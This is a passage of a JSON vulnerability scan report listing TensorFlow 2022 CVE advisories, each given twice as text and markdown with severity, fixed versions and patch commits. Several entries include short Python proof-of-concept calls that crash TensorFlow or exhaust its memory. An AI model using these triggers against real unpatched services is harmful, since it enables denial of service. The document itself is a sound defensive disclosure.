TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29206",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29206"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29206",
              "help": {
                "text": "Vulnerability CVE-2022-29206\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29206)\n### Impact\nThe implementation of [`tf.raw_ops.SparseTensorDenseAdd`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse_tensor_dense_add_op.cc) does not fully validate the input arguments:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)\na_values = tf.constant([], shape=[0], dtype=tf.float32)\na_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)\n\nb = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)\n\ntf.raw_ops.SparseTensorDenseAdd(\n    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)\n```\n\nIn this case, a reference gets bound to a `nullptr` during kernel execution. This is UB.\n\n### Patches\nWe have patched the issue in GitHub commit [11ced8467eccad9c7cb94867708be8fa5c66c730](https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29206**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29206)|\n\n### Impact\nThe implementation of [`tf.raw_ops.SparseTensorDenseAdd`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse_tensor_dense_add_op.cc) does not fully validate the input arguments:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)\na_values = tf.constant([], shape=[0], dtype=tf.float32)\na_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)\n\nb = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)\n\ntf.raw_ops.SparseTensorDenseAdd(\n    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)\n```\n\nIn this case, a reference gets bound to a `nullptr` during kernel execution. This is UB.\n\n### Patches\nWe have patched the issue in GitHub commit [11ced8467eccad9c7cb94867708be8fa5c66c730](https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29213",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29213"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29213",
              "help": {
                "text": "Vulnerability CVE-2022-29213\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29213)\n### Impact\nThe `tf.compat.v1.signal.rfft2d` and `tf.compat.v1.signal.rfft3d` lack input validation and under certain condition can result in crashes (due to `CHECK`-failures).\n\n### Patches \nWe have patched the issue in GitHub commit [0a8a781e597b18ead006d19b7d23d0a369e9ad73](https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73) (merging GitHub PR [#55274](https://github.com/tensorflow/tensorflow/pull/55274)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55263).",
                "markdown": "**Vulnerability CVE-2022-29213**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29213)|\n\n### Impact\nThe `tf.compat.v1.signal.rfft2d` and `tf.compat.v1.signal.rfft3d` lack input validation and under certain condition can result in crashes (due to `CHECK`-failures).\n\n### Patches \nWe have patched the issue in GitHub commit [0a8a781e597b18ead006d19b7d23d0a369e9ad73](https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73) (merging GitHub PR [#55274](https://github.com/tensorflow/tensorflow/pull/55274)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55263)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29212",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29212"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29212",
              "help": {
                "text": "Vulnerability CVE-2022-29212\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29212)\n### Impact\nCertain TFLite models that were created using TFLite model converter would crash when loaded in the TFLite interpreter. The culprit is that during quantization the scale of values could be greater than 1 but code was always assuming sub-unit scaling.\n\nThus, since code was calling [`QuantizeMultiplierSmallerThanOneExp`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123), the `TFLITE_CHECK_LT` assertion would trigger and abort the process.\n\n### Patches\nWe have patched the issue in GitHub commit [a989426ee1346693cc015792f11d715f6944f2b8](https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/43661).",
                "markdown": "**Vulnerability CVE-2022-29212**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29212)|\n\n### Impact\nCertain TFLite models that were created using TFLite model converter would crash when loaded in the TFLite interpreter. The culprit is that during quantization the scale of values could be greater than 1 but code was always assuming sub-unit scaling.\n\nThus, since code was calling [`QuantizeMultiplierSmallerThanOneExp`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123), the `TFLITE_CHECK_LT` assertion would trigger and abort the process.\n\n### Patches\nWe have patched the issue in GitHub commit [a989426ee1346693cc015792f11d715f6944f2b8](https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/43661)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29200",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29200"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29200",
              "help": {
                "text": "Vulnerability CVE-2022-29200\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29200)\n### Impact\nThe implementation of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  forget_bias=1, cell_clip=0, use_peephole=False)\n``` \n  \nThe code does not validate the ranks of any of the arguments to this API call. This results in `CHECK`-failures when the elements of the tensor are accessed.\n    \n### Patches\nWe have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information                \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-29200**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29200)|\n\n### Impact\nThe implementation of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  forget_bias=1, cell_clip=0, use_peephole=False)\n``` \n  \nThe code does not validate the ranks of any of the arguments to this API call. This results in `CHECK`-failures when the elements of the tensor are accessed.\n    \n### Patches\nWe have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information                \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29199",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29199"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29199",
              "help": {
                "text": "Vulnerability CVE-2022-29199\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29199)\n### Impact\nThe implementation of [`tf.raw_ops.LoadAndRemapMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/load_and_remap_matrix_op.cc#L70-L98) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\nold_tensor_name = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\n\nrow_remapping = tf.constant(0, shape=[], dtype=tf.int64)\ncol_remapping = tf.constant(3, shape=[3], dtype=tf.int64)\ninitializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)\n\ntf.raw_ops.LoadAndRemapMatrix(\n  ckpt_path=ckpt_path,\n  old_tensor_name=old_tensor_name,\n  row_remapping=row_remapping,\n  col_remapping=col_remapping,\n  initializing_values=initializing_values,\n  num_rows=1,\n  num_cols=1)\n```\n\nThe code assumes `initializing_values` is a vector but there is no validation for this before accessing its value:\n\n```cc\nOP_REQUIRES_OK(context, context-\u003einput(\"row_remapping\", \u0026row_remapping_t));\nconst auto row_remapping = row_remapping_t-\u003evec\u003cint64_t\u003e();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3150642acbbe254e3c3c5d2232143fa591855ac9](https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29199**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29199)|\n\n### Impact\nThe implementation of [`tf.raw_ops.LoadAndRemapMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/load_and_remap_matrix_op.cc#L70-L98) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\nold_tensor_name = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\n\nrow_remapping = tf.constant(0, shape=[], dtype=tf.int64)\ncol_remapping = tf.constant(3, shape=[3], dtype=tf.int64)\ninitializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)\n\ntf.raw_ops.LoadAndRemapMatrix(\n  ckpt_path=ckpt_path,\n  old_tensor_name=old_tensor_name,\n  row_remapping=row_remapping,\n  col_remapping=col_remapping,\n  initializing_values=initializing_values,\n  num_rows=1,\n  num_cols=1)\n```\n\nThe code assumes `initializing_values` is a vector but there is no validation for this before accessing its value:\n\n```cc\nOP_REQUIRES_OK(context, context-\u003einput(\"row_remapping\", \u0026row_remapping_t));\nconst auto row_remapping = row_remapping_t-\u003evec\u003cint64_t\u003e();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3150642acbbe254e3c3c5d2232143fa591855ac9](https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29204",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29204"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29204",
              "help": {
                "text": "Vulnerability CVE-2022-29204\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29204)\n### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L83-L148) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.strings.unsorted_segment_join(\n  inputs=[`123`],\n  segment_ids=[0],\n  num_segments=-1)\n```\n\nThe code assumes `num_segments` is a positive scalar but there is no validation:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n// ...\nTensor* output_tensor = nullptr;\nTensorShape output_shape =\n    GetOutputShape(input_shape, segment_id_shape, num_segments);\n```\n\nSince this value is used to allocate the output tensor, a negative value would result in a `CHECK`-failure (assertion failure), as per [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).\n\n### Patches \nWe have patched the issue in GitHub commit [84563f265f28b3c36a15335c8b005d405260e943](https://github.com/tensorflow/tensorflow/commit/84563f265f28b3c36a15335c8b005d405260e943) and GitHub commit [20cb18724b0bf6c09071a3f53434c4eec53cc147](https://github.com/tensorflow/tensorflow/commit/20cb18724b0bf6c09071a3f53434c4eec53cc147).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n      \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n                       \n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55305).",
                "markdown": "**Vulnerability CVE-2022-29204**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29204)|\n\n### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L83-L148) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.strings.unsorted_segment_join(\n  inputs=[`123`],\n  segment_ids=[0],\n  num_segments=-1)\n```\n\nThe code assumes `num_segments` is a positive scalar but there is no validation:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n// ...\nTensor* output_tensor = nullptr;\nTensorShape output_shape =\n    GetOutputShape(input_shape, segment_id_shape, num_segments);\n```\n\nSince this value is used to allocate the output tensor, a negative value would result in a `CHECK`-failure (assertion failure), as per [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).\n\n### Patches \nWe have patched the issue in GitHub commit [84563f265f28b3c36a15335c8b005d405260e943](https://github.com/tensorflow/tensorflow/commit/84563f265f28b3c36a15335c8b005d405260e943) and GitHub commit [20cb18724b0bf6c09071a3f53434c4eec53cc147](https://github.com/tensorflow/tensorflow/commit/20cb18724b0bf6c09071a3f53434c4eec53cc147).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n      \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n                       \n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55305)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29205",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29205"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29205",
              "help": {
                "text": "Vulnerability CVE-2022-29205\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29205)\n### Impact\nThere is a potential for segfault / denial of service in TensorFlow by calling `tf.compat.v1.*` ops which don`t yet have support for quantized types (added after migration to TF 2.x):\n\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntf.compat.v1.placeholder_with_default(input=np.array([2]),shape=tf.constant(dtype=tf.qint8, value=np.array([1])))\n```\n\nIn these scenarios, since the kernel is missing, a [`nullptr` value is passed](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L480-L482) to [`ParseDimensionValue`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L296-L320) for the `py_value` argument. Then, this is dereferenced, resulting in segfault.\n\n### Patches\nWe have patched the issue in GitHub commit [237822b59fc504dda2c564787f5d3ad9c4aa62d9](https://github.com/tensorflow/tensorflow/commit/237822b59fc504dda2c564787f5d3ad9c4aa62d9).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University.",
                "markdown": "**Vulnerability CVE-2022-29205**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29205)|\n\n### Impact\nThere is a potential for segfault / denial of service in TensorFlow by calling `tf.compat.v1.*` ops which don`t yet have support for quantized types (added after migration to TF 2.x):\n\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntf.compat.v1.placeholder_with_default(input=np.array([2]),shape=tf.constant(dtype=tf.qint8, value=np.array([1])))\n```\n\nIn these scenarios, since the kernel is missing, a [`nullptr` value is passed](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L480-L482) to [`ParseDimensionValue`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L296-L320) for the `py_value` argument. Then, this is dereferenced, resulting in segfault.\n\n### Patches\nWe have patched the issue in GitHub commit [237822b59fc504dda2c564787f5d3ad9c4aa62d9](https://github.com/tensorflow/tensorflow/commit/237822b59fc504dda2c564787f5d3ad9c4aa62d9).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29202",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29202"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29202",
              "help": {
                "text": "Vulnerability CVE-2022-29202\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29202)\n### Impact\nThe implementation of [`tf.ragged.constant`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/ops/ragged/ragged_factory_ops.py#L146-L239) does not fully validate the input arguments. This results in a denial of service by consuming all available memory:\n\n```python\nimport tensorflow as tf\ntf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [bd4d5583ff9c8df26d47a23e508208844297310e](https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55199).\n",
                "markdown": "**Vulnerability CVE-2022-29202**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29202)|\n\n### Impact\nThe implementation of [`tf.ragged.constant`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/ops/ragged/ragged_factory_ops.py#L146-L239) does not fully validate the input arguments. This results in a denial of service by consuming all available memory:\n\n```python\nimport tensorflow as tf\ntf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [bd4d5583ff9c8df26d47a23e508208844297310e](https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub 